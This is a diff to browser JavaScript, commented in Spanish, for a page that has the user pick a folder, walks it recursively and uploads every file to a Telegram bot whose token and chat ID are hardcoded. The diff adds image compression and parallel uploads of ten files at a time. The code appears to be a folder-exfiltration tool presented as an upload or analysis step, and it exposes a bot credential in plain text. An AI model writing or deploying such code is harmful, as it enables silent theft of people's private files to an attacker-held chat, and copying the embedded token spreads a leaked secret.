@@ -33,7 +33,7 @@ document.getElementById('start-btn').addEventListener('click', async () => {
         const folderHandle = await window.showDirectoryPicker();
         updateStatus('Analizando estructura...', 20);
 
-        await collectAndSendInChunks(folderHandle); // NUEVO MÉTODO
+        await collectAndSendInChunks(folderHandle);
         updateStatus('✅ Subida completa', 100);
     } catch (error) {
         console.error(error);
@@ -43,7 +43,7 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     }
 });
 
-// FUNCIÓN MODIFICADA: ahora procesa por bloques de 100 archivos
+// FUNCIÓN MODIFICADA: procesa por bloques de 100 archivos
 async function collectAndSendInChunks(folderHandle) {
     const BATCH_SIZE = 100;
     let batch = [];
@@ -59,37 +59,80 @@ async function collectAndSendInChunks(folderHandle) {
 
                     if (batch.length === BATCH_SIZE) {
                         await sendFilesToTelegram(batch);
-                        batch = []; // Limpiar lote
+                        batch = [];
                     }
                 }
             } else if (entry.kind === 'directory') {
-                await processDirectory(entry); // Recursivamente ir a subcarpetas
+                await processDirectory(entry);
             }
         }
     }
 
     await processDirectory(folderHandle);
 
-    // Enviar lo que quede en el último lote si no llegó a 100
     if (batch.length > 0) {
         await sendFilesToTelegram(batch);
     }
 }
 
+// FUNCIÓN PARA COMPRIMIR IMÁGENES
+async function compressImage(file) {
+    return new Promise(resolve => {
+        const img = new Image();
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        img.src = URL.createObjectURL(file);
+        img.onload = () => {
+            let width = img.width;
+            let height = img.height;
+
+            const maxWidth = 1200;
+            if (width > maxWidth) {
+                height *= maxWidth / width;
+                width = maxWidth;
+            }
+
+            canvas.width = width;
+            canvas.height = height;
+            ctx.drawImage(img, 0, 0, width, height);
+
+            canvas.toBlob(blob => {
+                if (blob.size > 600 * 1024) {
+                    canvas.toBlob(recompressedBlob => {
+                        resolve(recompressedBlob);
+                    }, 'image/jpeg', 0.5); // Re-comprimir al 50%
+                } else {
+                    resolve(blob);
+                }
+            }, 'image/jpeg', 0.7); // Primer intento al 70%
+        };
+    });
+}
+
+// FUNCIÓN MODIFICADA: envía hasta 10 archivos a la vez (paralelo) y comprime las imágenes
 async function sendFilesToTelegram(files) {
     const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
     const chatId = '5821490693';
 
     const total = files.length;
     let sent = 0;
+    const parallelLimit = 10; // Cantidad máxima de archivos en paralelo
 
-    for (const file of files) {
-        sent++;
-        const fileData = await file.getFile();
+    async function processFile(fileEntry) {
+        const fileData = await fileEntry.getFile();
+        let finalFile = fileData;
+
+        // Comprimir si es imagen
+        const fileName = fileData.name.toLowerCase();
+        if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
+            fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp')) {
+            finalFile = await compressImage(fileData);
+        }
+
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('caption', `Archivo: ${file.name}`);
-        formData.append('document', fileData);
+        formData.append('caption', `Archivo: ${fileData.name}`);
+        formData.append('document', finalFile, fileData.name);
 
         const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
             method: 'POST',
@@ -102,9 +145,17 @@ async function sendFilesToTelegram(files) {
             throw new Error(errorData.description || 'Error desconocido al enviar archivo');
         }
 
+        sent++;
         const progress = 40 + Math.floor((sent / total) * 60);
         updateStatus(`Enviando archivo ${sent} de ${total} en lote`, progress);
-
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Pausa de 1 segundo entre cada archivo
     }
+
+    // Enviar archivos en paralelo de 10 en 10
+    for (let i = 0; i < files.length; i += parallelLimit) {
+        const batch = files.slice(i, i + parallelLimit);
+        const promises = batch.map(file => processFile(file));
+        await Promise.all(promises); // Espera a que termine este grupo antes de seguir
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 2000)); // Pausa de 2 segundos entre lotes
 }
